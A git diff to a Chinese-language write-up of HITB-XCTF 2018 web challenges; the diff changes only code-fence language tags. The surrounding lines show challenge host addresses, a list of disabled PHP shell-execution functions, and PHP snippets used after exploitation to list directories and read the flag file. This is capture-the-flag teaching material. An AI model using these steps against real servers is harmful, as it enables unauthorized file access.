@@ -43,7 +43,7 @@ PORT      STATE  SERVICE       VERSION
 直接访问：`http://47.75.146.42:9999/index.php`
 
 下载`index.php`
-```
+```php+HTML
 This is a pentest challenge, open your mind!
 <img style="width: 300px;" src="jd.png" alt="the picture is unrelated to this challenge, just a advertisement" />
 
@@ -86,7 +86,7 @@ http://47.90.97.18:9999
 直接右键查看源代码，发现提示。
 
 ![image](http://osn75zd5c.bkt.clouddn.com/HITBXCTF2018-Web-upload-1.png)
-```
+```php+HTML
 <!--pic.php?filename=default.jpg-->
 ```
 访问一下，会返回default.jpg的长和宽
@@ -132,7 +132,7 @@ http://www.freebuf.com/column/164698.html
 assert,passthru,exec,system,chroot,scandir,chgrp,chown,shell_exec,proc_open,proc_get_status,ini_alter,ini_alter,ini_restore,dl,pfsockopen,openlog,syslog,readlink,symlink,popepassthru,stream_socket_server,fsocket,fsockopen
 ```
 构造代码列出目录文件。
-```
+```php
 function listDirFiles($DirPath){ 
     if($dir = opendir($DirPath)){ 
          while(($file = readdir($dir))!== false){ 
@@ -150,7 +150,7 @@ listDirFiles('c:/Inetpub/wwwroot/');
 ![image](http://osn75zd5c.bkt.clouddn.com/HITBXCTF2018-Web-upload-8.png)
 
 再构造代码
-```
+```php
 <?php
   $filename = "c:/Inetpub/wwwroot/flag.php";
   $handle = fopen($filename, "r");
